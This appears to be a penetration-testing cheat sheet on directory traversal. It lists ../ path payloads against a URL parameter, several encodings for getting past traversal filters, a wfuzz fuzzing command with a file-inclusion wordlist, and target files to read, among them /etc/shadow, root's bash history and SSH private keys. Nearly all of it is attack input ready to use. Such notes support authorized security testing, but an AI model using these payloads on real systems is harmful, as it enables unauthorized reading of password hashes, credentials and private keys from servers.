---
title: Directory Traversal
tags:
  - Exploitation
  - Web
---

### Tips & Tricks

```
If the host use windows try "\"
```

---

### Command attack vectors

```bash 
https://website.com?page=fr.php => https://website.com?page=../../../etc/passwd

# Bypass protection
http://website.com?page=../../etc/passwd => http://website.com?page=%2e%2e/%2e%2e/etc/passwd

# Basic Encoding
# . = %2e
# / = %2f
# . = %u002e
# / = %u2215
# \ = %u2216
# . = %252e
# / = %252f
# \ = %255c
# . = %c0%2e, %e0%40%ae, %c0ae
# / = %c0%af, %e0%80%af, %c0%2f
# \ = %c0%5c, %c0%80%5c
```

---

### Fuzzing

```bash 
wfuzz -c -w $wordlist --hw 0 http://website.com?page=FUZZ
```

[!file Linux File Inclusion wordlist](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)

---

### Useful file to query

```bash 
# Common Linux file
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/shadow
/root/.bash_history
/var/mail/root
/var/spool/cron/crontabs/root
/etc/sysconfig/iptables
/etc/sysconfig/ip6tables

# Private key
/.ssh/id_rsa
/.ssh/id_dsa
/.ssh/id_ed25519
/.ssh/id_ecdsa

# Query file inside /var/www/html/
index.php
index.js
```